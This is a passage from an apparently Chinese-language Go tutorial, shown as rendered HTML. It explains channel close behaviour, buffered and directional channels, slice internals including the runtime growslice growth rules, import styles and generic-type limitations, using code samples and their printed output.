<h4 id="1-close之后不能写，正在写的会崩溃"><a href="#1-close之后不能写，正在写的会崩溃" class="headerlink" title="1) close之后不能写，正在写的会崩溃"></a>1) close之后不能写，正在写的会崩溃</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;begin write&quot;</span>)</span><br><span class="line">		ch &lt;- <span class="number">1</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;end write&quot;</span>)</span><br><span class="line">	&#125;()</span><br><span class="line">	time.Sleep(time.Second)</span><br><span class="line">	<span class="built_in">close</span>(ch)</span><br><span class="line">	fmt.Println(<span class="string">&quot;close done&quot;</span>)</span><br><span class="line">	time.Sleep(time.Second)</span><br><span class="line">	fmt.Println(<span class="string">&quot;main done&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">begin write</span></span><br><span class="line"><span class="comment">close done</span></span><br><span class="line"><span class="comment">panic: send on closed channel</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">goroutine 18 [running]:</span></span><br><span class="line"><span class="comment">main.main.func1()</span></span><br><span class="line"><span class="comment">        /path/to/main.go:12 +0x6c</span></span><br><span class="line"><span class="comment">created by main.main</span></span><br><span class="line"><span class="comment">        /path/to/main.go:10 +0x6c</span></span><br><span class="line"><span class="comment">exit status 2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="2-close之后可以读，把没读完的读完就退出了，for就读完退出，没数据直接读拿到默认值"><a href="#2-close之后可以读，把没读完的读完就退出了，for就读完退出，没数据直接读拿到默认值" class="headerlink" title="2) close之后可以读，把没读完的读完就退出了，for就读完退出，没数据直接读拿到默认值"></a>2) close之后可以读，把没读完的读完就退出了，for就读完退出，没数据直接读拿到默认值</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;begin write&quot;</span>)</span><br><span class="line">		ch &lt;- <span class="number">1</span></span><br><span class="line">		ch &lt;- <span class="number">2</span></span><br><span class="line">		ch &lt;- <span class="number">3</span></span><br><span class="line">		ch &lt;- <span class="number">4</span></span><br><span class="line">		ch &lt;- <span class="number">5</span></span><br><span class="line">		fmt.Println(<span class="string">&quot;end write&quot;</span>)</span><br><span class="line">	&#125;()</span><br><span class="line">	time.Sleep(time.Second)</span><br><span class="line">	<span class="built_in">close</span>(ch)</span><br><span class="line">	fmt.Println(<span class="string">&quot;close done&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> v := <span class="keyword">range</span> ch &#123;</span><br><span class="line">		fmt.Println(v)</span><br><span class="line">	&#125;</span><br><span class="line">	v := &lt;-ch <span class="comment">// 没数据拿到默认值</span></span><br><span class="line">	fmt.Println(v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">begin write</span></span><br><span class="line"><span class="comment">end write</span></span><br><span class="line"><span class="comment">close done</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">5</span></span><br><span class="line"><span class="comment">0</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="17-3-缓冲与无缓冲"><a href="#17-3-缓冲与无缓冲" class="headerlink" title="17.3. 缓冲与无缓冲"></a>17.3. 缓冲与无缓冲</h3><ul>
<li>无缓冲channel只负责数据的流转不负责存储数据，所以发送前必须有数据的接收者，否则发送会阻塞</li>
<li>缓冲channel可以储存部分数据，发送在缓冲区满之前可以发完继续运行</li>
</ul>
<h3 id="17-4-只读和只写chan"><a href="#17-4-只读和只写chan" class="headerlink" title="17.4. 只读和只写chan"></a>17.4. 只读和只写chan</h3><ul>
<li>只读和只写一般由一个可读可写的channel转化而来</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">productor</span><span class="params">(wch <span class="keyword">chan</span>&lt;- <span class="type">int</span>)</span></span> &lt;-<span class="keyword">chan</span> <span class="type">bool</span> &#123;</span><br><span class="line">	quit := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;product&quot;</span>, i)</span><br><span class="line">			wch &lt;- i</span><br><span class="line">		&#125;</span><br><span class="line">		quit &lt;- <span class="literal">true</span></span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">return</span> quit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consumer</span><span class="params">(rch &lt;-<span class="keyword">chan</span> <span class="type">int</span>)</span></span> &lt;-<span class="keyword">chan</span> <span class="type">bool</span> &#123;</span><br><span class="line">	quit := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> v := <span class="keyword">range</span> rch &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;consumer&quot;</span>, v)</span><br><span class="line">			time.Sleep(<span class="number">100</span> * time.Millisecond)</span><br><span class="line">		&#125;</span><br><span class="line">		quit &lt;- <span class="literal">true</span></span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">return</span> quit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	rwCh := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">10</span>)</span><br><span class="line">	qw := productor(rwCh)</span><br><span class="line">	qr := consumer(rwCh)</span><br><span class="line">	&lt;-qw</span><br><span class="line">	<span class="built_in">close</span>(rwCh)</span><br><span class="line">	&lt;-qr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="17-5-底层原理"><a href="#17-5-底层原理" class="headerlink" title="17.5. 底层原理"></a>17.5. 底层原理</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /usr/lib/go/src/runtime/chan.go</span></span><br><span class="line"><span class="keyword">type</span> hchan <span class="keyword">struct</span> &#123;</span><br><span class="line">	qcount   <span class="type">uint</span>           <span class="comment">// total data in the queue</span></span><br><span class="line">	dataqsiz <span class="type">uint</span>           <span class="comment">// size of the circular queue</span></span><br><span class="line">	buf      unsafe.Pointer <span class="comment">// points to an array of dataqsiz elements</span></span><br><span class="line">	elemsize <span class="type">uint16</span></span><br><span class="line">	closed   <span class="type">uint32</span></span><br><span class="line">	elemtype *_type <span class="comment">// element type</span></span><br><span class="line">	sendx    <span class="type">uint</span>   <span class="comment">// send index</span></span><br><span class="line">	recvx    <span class="type">uint</span>   <span class="comment">// receive index</span></span><br><span class="line">	recvq    waitq  <span class="comment">// list of recv waiters</span></span><br><span class="line">	sendq    waitq  <span class="comment">// list of send waiters</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// lock protects all fields in hchan, as well as several</span></span><br><span class="line">	<span class="comment">// fields in sudogs blocked on this channel.</span></span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	<span class="comment">// Do not change another G&#x27;s status while holding this lock</span></span><br><span class="line">	<span class="comment">// (in particular, do not ready a G), as this can deadlock</span></span><br><span class="line">	<span class="comment">// with stack shrinking.</span></span><br><span class="line">	lock mutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/lib/go/src/cmd/compile/internal/types/type.go</span></span><br><span class="line"><span class="comment">// Chan contains Type fields specific to channel types.</span></span><br><span class="line"><span class="keyword">type</span> Chan <span class="keyword">struct</span> &#123;</span><br><span class="line">	Elem *Type   <span class="comment">// element type</span></span><br><span class="line">	Dir  ChanDir <span class="comment">// channel direction</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/lib/go/src/cmd/compile/internal/types/type.go</span></span><br><span class="line"><span class="comment">// NewChan returns a new chan Type with direction dir.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewChan</span><span class="params">(elem *Type, dir ChanDir)</span></span> *Type &#123;</span><br><span class="line">	t := newType(TCHAN)</span><br><span class="line">	ct := t.ChanType()</span><br><span class="line">	ct.Elem = elem</span><br><span class="line">	ct.Dir = dir</span><br><span class="line">	<span class="keyword">if</span> elem.HasTParam() &#123;</span><br><span class="line">		t.SetHasTParam(<span class="literal">true</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> elem.HasShape() &#123;</span><br><span class="line">		t.SetHasShape(<span class="literal">true</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/lib/go/src/cmd/compile/internal/types/type.go</span></span><br><span class="line"><span class="comment">// New returns a new Type of the specified kind.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newType</span><span class="params">(et Kind)</span></span> *Type &#123;</span><br><span class="line">	t := &amp;Type&#123;</span><br><span class="line">		kind:  et,</span><br><span class="line">		width: BADWIDTH,</span><br><span class="line">	&#125;</span><br><span class="line">	t.underlying = t</span><br><span class="line">	<span class="comment">// TODO(josharian): lazily initialize some of these?</span></span><br><span class="line">	<span class="keyword">switch</span> t.kind &#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">case</span> TCHAN:</span><br><span class="line">		t.extra = <span class="built_in">new</span>(Chan)</span><br><span class="line">    ...</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>底层也是指针，所以传参传入的是指针，不用担心被拷贝</li>
</ul>
<h2 id="18-slice"><a href="#18-slice" class="headerlink" title="18. slice"></a>18. slice</h2><h3 id="18-1-一些基本操作"><a href="#18-1-一些基本操作" class="headerlink" title="18.1. 一些基本操作"></a>18.1. 一些基本操作</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/****** slice初始化 ******/</span></span><br><span class="line">s0 := []<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line">s1 := []<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>&#125;</span><br><span class="line">s2 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">5</span>)		<span class="comment">// len 5, cap 5</span></span><br><span class="line">s3 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">10</span>)	<span class="comment">// len 0, cap 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/****** slice添加元素 ******/</span></span><br><span class="line"><span class="comment">// go对append有处理，如果赋值给原切片，且切片空间足够，不会新申请内存</span></span><br><span class="line"><span class="comment">// 赋值给原切片，空间不够，会申请cap的两倍大小空间</span></span><br><span class="line"><span class="comment">// 如果赋值给不同切片，会新申请内存，不会更改原切片</span></span><br><span class="line">s0 = <span class="built_in">append</span>(s0, <span class="number">2</span>)</span><br><span class="line">s0 = <span class="built_in">append</span>(s0, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="comment">// 切片合并，其中s1...意味着将s1拆分成元素传入append</span></span><br><span class="line"><span class="comment">// 相当于调用添加多个元素</span></span><br><span class="line">s0 = <span class="built_in">append</span>(s0, s1...)</span><br><span class="line"></span><br><span class="line"><span class="comment">/****** slice删除元素 ******/</span></span><br><span class="line">s0 = s0[<span class="number">2</span>:]				<span class="comment">// 截取2到末尾，删除前两个元素</span></span><br><span class="line">s1 = s1[:<span class="built_in">len</span>(s1)<span class="number">-2</span>]		<span class="comment">// 开头到倒数第3个元素，删除后两个元素</span></span><br><span class="line">s0 = s0[:<span class="number">0</span>]				<span class="comment">// 清理slice，不改变cap</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/****** 遍历 ******/</span></span><br><span class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> s0 &#123;</span><br><span class="line">	fmt.Println(v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-2-切片截取"><a href="#18-2-切片截取" class="headerlink" title="18.2. 切片截取"></a>18.2. 切片截取</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">testArr := []<span class="type">int</span>&#123;<span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>&#125;</span><br><span class="line">fmt.Println(<span class="built_in">cap</span>(testArr), testArr) <span class="comment">// 7 [2 7 4 9 1 4 8]</span></span><br><span class="line">testArr = testArr[:<span class="built_in">len</span>(testArr)<span class="number">-1</span>]</span><br><span class="line">fmt.Println(<span class="built_in">cap</span>(testArr), testArr) <span class="comment">// 7 [2 7 4 9 1 4]</span></span><br><span class="line">testArr = testArr[<span class="number">1</span>:]</span><br><span class="line">fmt.Println(<span class="built_in">cap</span>(testArr), testArr) <span class="comment">// 6 [7 4 9 1 4]</span></span><br><span class="line">testArr = testArr[:<span class="number">0</span>]              <span class="comment">// 清理slice，不改变容量</span></span><br><span class="line">fmt.Println(<span class="built_in">cap</span>(testArr), testArr) <span class="comment">// 6 []</span></span><br></pre></td></tr></table></figure>

<ul>
<li>可以认为切片的截取就是在原切片的基础上，返回了一个切片，data的首地址、len、cap分别改了一下，本质上复用了原始的地址空间</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := []<span class="type">int</span>&#123;</span><br><span class="line">		<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&amp;a[<span class="number">0</span>], &amp;a[<span class="number">1</span>])	<span class="comment">// 0x40000160c0 0x40000160c8</span></span><br><span class="line">	b := a[:<span class="number">3</span>]</span><br><span class="line">	fmt.Println(&amp;b[<span class="number">0</span>], &amp;b[<span class="number">1</span>]) 	<span class="comment">// 0x40000160c0 0x40000160c8 和a完全一样</span></span><br><span class="line">	b[<span class="number">0</span>] = <span class="number">3</span></span><br><span class="line">	fmt.Println(a)	<span class="comment">// [3 2 3 4 5]	改动会改动到a里面</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-3-动态初始化二维数组（矩阵）"><a href="#18-3-动态初始化二维数组（矩阵）" class="headerlink" title="18.3. 动态初始化二维数组（矩阵）"></a>18.3. 动态初始化二维数组（矩阵）</h3><ul>
<li>矩阵的长宽不确定，构建的时候就需要一个一个进行构建，类似下面这样</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">seen := <span class="built_in">make</span>([][]<span class="type">bool</span>, r)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; r; i++ &#123;</span><br><span class="line">	seen[i] = <span class="built_in">make</span>([]<span class="type">bool</span>, c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18-4-底层实现原理"><a href="#18-4-底层实现原理" class="headerlink" title="18.4. 底层实现原理"></a>18.4. 底层实现原理</h3><h4 id="底层数据结构"><a href="#底层数据结构" class="headerlink" title="底层数据结构"></a>底层数据结构</h4><ul>
<li>slice本身是一个结构体</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /usr/lib/go/src/runtime/slice.go</span></span><br><span class="line"><span class="keyword">type</span> slice <span class="keyword">struct</span> &#123;</span><br><span class="line">	array unsafe.Pointer</span><br><span class="line">	<span class="built_in">len</span>   <span class="type">int</span></span><br><span class="line">	<span class="built_in">cap</span>   <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/lib/go/src/cmd/compile/internal/types/type.go</span></span><br><span class="line"><span class="comment">// NewSlice returns the slice Type with element type elem.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewSlice</span><span class="params">(elem *Type)</span></span> *Type &#123;</span><br><span class="line">	<span class="keyword">if</span> t := elem.cache.slice; t != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> t.Elem() != elem &#123;</span><br><span class="line">			base.Fatalf(<span class="string">&quot;elem mismatch&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> elem.HasTParam() != t.HasTParam() || elem.HasShape() != t.HasShape() &#123;</span><br><span class="line">			base.Fatalf(<span class="string">&quot;Incorrect HasTParam/HasShape flag for cached slice type&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> t</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	t := newType(TSLICE)</span><br><span class="line">	t.extra = Slice&#123;Elem: elem&#125;</span><br><span class="line">	elem.cache.slice = t</span><br><span class="line">	<span class="keyword">if</span> elem.HasTParam() &#123;</span><br><span class="line">		t.SetHasTParam(<span class="literal">true</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> elem.HasShape() &#123;</span><br><span class="line">		t.SetHasShape(<span class="literal">true</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h4><ul>
<li>基于<code>golang v1.20.3</code>版本代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /usr/lib/go/src/runtime/slice.go</span></span><br><span class="line"><span class="comment">// growslice allocates new backing store for a slice.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// arguments:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//	oldPtr = pointer to the slice&#x27;s backing array</span></span><br><span class="line"><span class="comment">//	newLen = new length (= oldLen + num)</span></span><br><span class="line"><span class="comment">//	oldCap = original slice&#x27;s capacity.</span></span><br><span class="line"><span class="comment">//	   num = number of elements being added</span></span><br><span class="line"><span class="comment">//	    et = element type</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// return values:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//	newPtr = pointer to the new backing store</span></span><br><span class="line"><span class="comment">//	newLen = same value as the argument</span></span><br><span class="line"><span class="comment">//	newCap = capacity of the new backing store</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Requires that uint(newLen) &gt; uint(oldCap).</span></span><br><span class="line"><span class="comment">// Assumes the original slice length is newLen - num</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// A new backing store is allocated with space for at least newLen elements.</span></span><br><span class="line"><span class="comment">// Existing entries [0, oldLen) are copied over to the new backing store.</span></span><br><span class="line"><span class="comment">// Added entries [oldLen, newLen) are not initialized by growslice</span></span><br><span class="line"><span class="comment">// (although for pointer-containing element types, they are zeroed). They</span></span><br><span class="line"><span class="comment">// must be initialized by the caller.</span></span><br><span class="line"><span class="comment">// Trailing entries [newLen, newCap) are zeroed.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// growslice&#x27;s odd calling convention makes the generated code that calls</span></span><br><span class="line"><span class="comment">// this function simpler. In particular, it accepts and returns the</span></span><br><span class="line"><span class="comment">// new length so that the old length is not live (does not need to be</span></span><br><span class="line"><span class="comment">// spilled/restored) and the new length is returned (also does not need</span></span><br><span class="line"><span class="comment">// to be spilled/restored).</span></span><br><span class="line"><span class="comment">// newLen 期望多少</span></span><br><span class="line"><span class="comment">// num    要添加多少</span></span><br><span class="line"><span class="comment">// oldCap 原来有多少容量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">growslice</span><span class="params">(oldPtr unsafe.Pointer, newLen, oldCap, num <span class="type">int</span>, et *_type)</span></span> slice &#123;</span><br><span class="line">	oldLen := newLen - num  <span class="comment">// 原来有多少数据（非容量）</span></span><br><span class="line">    ...     <span class="comment">// 省略检查</span></span><br><span class="line">	newcap := oldCap</span><br><span class="line">	doublecap := newcap + newcap    <span class="comment">// 原始容量double</span></span><br><span class="line">	<span class="keyword">if</span> newLen &gt; doublecap &#123;</span><br><span class="line">		newcap = newLen             <span class="comment">// 要添加的超过double，要多少给多少</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> threshold = <span class="number">256</span></span><br><span class="line">		<span class="keyword">if</span> oldCap &lt; threshold &#123;</span><br><span class="line">			newcap = doublecap      <span class="comment">// 不超过double，并且小于256，直接double容量</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Check 0 &lt; newcap to detect overflow</span></span><br><span class="line">			<span class="comment">// and prevent an infinite loop.</span></span><br><span class="line">			<span class="keyword">for</span> <span class="number">0</span> &lt; newcap &amp;&amp; newcap &lt; newLen &#123;</span><br><span class="line">				<span class="comment">// Transition from growing 2x for small slices</span></span><br><span class="line">				<span class="comment">// to growing 1.25x for large slices. This formula</span></span><br><span class="line">				<span class="comment">// gives a smooth-ish transition between the two.</span></span><br><span class="line">				newcap += (newcap + <span class="number">3</span>*threshold) / <span class="number">4</span>        <span class="comment">// 超过256，每次添加 1/4的当前容量 + 3/4的256也就是192 容量</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// Set newcap to the requested cap when</span></span><br><span class="line">			<span class="comment">// the newcap calculation overflowed.</span></span><br><span class="line">			<span class="keyword">if</span> newcap &lt;= <span class="number">0</span> &#123;</span><br><span class="line">				newcap = newLen</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    ...     <span class="comment">// 省略内存对齐和溢出检查，capmem 是 newcap * sizeof(item) 内存对齐后的大小（字节）</span></span><br><span class="line">	<span class="keyword">var</span> p unsafe.Pointer</span><br><span class="line">	<span class="keyword">if</span> et.ptrdata == <span class="number">0</span> &#123;</span><br><span class="line">		p = mallocgc(capmem, <span class="literal">nil</span>, <span class="literal">false</span>)</span><br><span class="line">		<span class="comment">// The append() that calls growslice is going to overwrite from oldLen to newLen.</span></span><br><span class="line">		<span class="comment">// Only clear the part that will not be overwritten.</span></span><br><span class="line">		<span class="comment">// The reflect_growslice() that calls growslice will manually clear</span></span><br><span class="line">		<span class="comment">// the region not cleared here.</span></span><br><span class="line">		memclrNoHeapPointers(add(p, newlenmem), capmem-newlenmem)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Note: can&#x27;t use rawmem (which avoids zeroing of memory), because then GC can scan uninitialized memory.</span></span><br><span class="line">		p = mallocgc(capmem, et, <span class="literal">true</span>)</span><br><span class="line">		<span class="keyword">if</span> lenmem &gt; <span class="number">0</span> &amp;&amp; writeBarrier.enabled &#123;</span><br><span class="line">			<span class="comment">// Only shade the pointers in oldPtr since we know the destination slice p</span></span><br><span class="line">			<span class="comment">// only contains nil pointers because it has been cleared during alloc.</span></span><br><span class="line">			bulkBarrierPreWriteSrcOnly(<span class="type">uintptr</span>(p), <span class="type">uintptr</span>(oldPtr), lenmem-et.size+et.ptrdata)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	memmove(p, oldPtr, lenmem)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> slice&#123;p, newLen, newcap&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="19-import-导入包"><a href="#19-import-导入包" class="headerlink" title="19. import 导入包"></a>19. import 导入包</h2><h3 id="19-1-普通导入"><a href="#19-1-普通导入" class="headerlink" title="19.1. 普通导入"></a>19.1. 普通导入</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello, world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="19-2-别名导入"><a href="#19-2-别名导入" class="headerlink" title="19.2. 别名导入"></a>19.2. 别名导入</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	f <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	f.Println(<span class="string">&quot;Hello, world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="19-3-隐藏导入"><a href="#19-3-隐藏导入" class="headerlink" title="19.3. 隐藏导入"></a>19.3. 隐藏导入</h3><ul>
<li>不调用，仅导入</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	_ <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="19-4-不需要使用包名字调用"><a href="#19-4-不需要使用包名字调用" class="headerlink" title="19.4. 不需要使用包名字调用"></a>19.4. 不需要使用包名字调用</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	. <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Println(<span class="string">&quot;Hello, world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="20-泛型"><a href="#20-泛型" class="headerlink" title="20. 泛型"></a>20. 泛型</h2><h3 id="20-1-泛型函数"><a href="#20-1-泛型函数" class="headerlink" title="20.1. 泛型函数"></a>20.1. 泛型函数</h3><ul>
<li>类似于c++的模板函数</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span>[<span class="title">T</span> <span class="title">any</span>]<span class="params">(l T)</span></span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="20-2-泛型的限制"><a href="#20-2-泛型的限制" class="headerlink" title="20.2. 泛型的限制"></a>20.2. 泛型的限制</h3><ul>
<li>泛型不能使用<code>a.(type)</code>获取类型，只能使用<code>reflect.TypeOf()</code>来获取</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetType</span>[<span class="title">T</span> <span class="title">any</span>]<span class="params">(a T)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 编译不允许</span></span><br><span class="line">	b := a.(<span class="type">int</span>)</span><br><span class="line">	fmt.Println(b)</span><br><span class="line">	<span class="comment">// 编译不允许</span></span><br><span class="line">	<span class="keyword">switch</span> a.(<span class="keyword">type</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;a is int&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用下面方式获取类型</span></span><br><span class="line">	b := reflect.TypeOf(a)</span><br><span class="line">	fmt.Println(<span class="string">&quot;a is&quot;</span>, b)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> b.Kind() &#123;</span><br><span class="line">	<span class="keyword">case</span> reflect.Int:</span><br><span class="line">		fmt.Println(<span class="string">&quot;a is int&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> reflect.Bool:</span><br><span class="line">		fmt.Println(<span class="string">&quot;a is bool&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="20-3-自定义泛型类型"><a href="#20-3-自定义泛型类型" class="headerlink" title="20.3. 自定义泛型类型"></a>20.3. 自定义泛型类型</h3><h4 id="comparable"><a href="#comparable" class="headerlink" title="comparable"></a>comparable</h4><ul>
<li>comparable只能针对<code>!=</code>和<code>==</code>两个操作符</li>
</ul>
